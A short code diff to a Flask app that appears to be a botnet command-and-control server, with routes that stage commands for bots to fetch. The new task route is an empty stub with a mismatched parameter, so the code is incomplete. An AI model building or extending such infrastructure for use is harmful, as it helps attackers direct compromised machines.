@@ -184,6 +184,13 @@ def register():
     except Exception as e:
         return '' 
 
+# TODO: Change this to POST, and add botkey for "authentication" <-- lmao 
+@app.route('/bot/<bot_ip>/task', methods=['GET'])
+def bottask():
+
+    
+
+
 @app.route('/bot/<bot_id>/push', methods=['POST'])
 def botpush(bot_id):
     """
@@ -226,13 +233,13 @@ def botpush(bot_id):
             query_bot.cmds.append(cmd)
             db.session.add(cmd)
             db.session.commit()
-            
+
+            return jsonify({'result': 'Command staged'})
+
         except Exception as e:
             print("[!!] ERROR for command!")
             print(e)
-
-        return ''
-
+            return jsonify({'error': 'Error occurred'})
 
     except Exception as e:
         return '' 
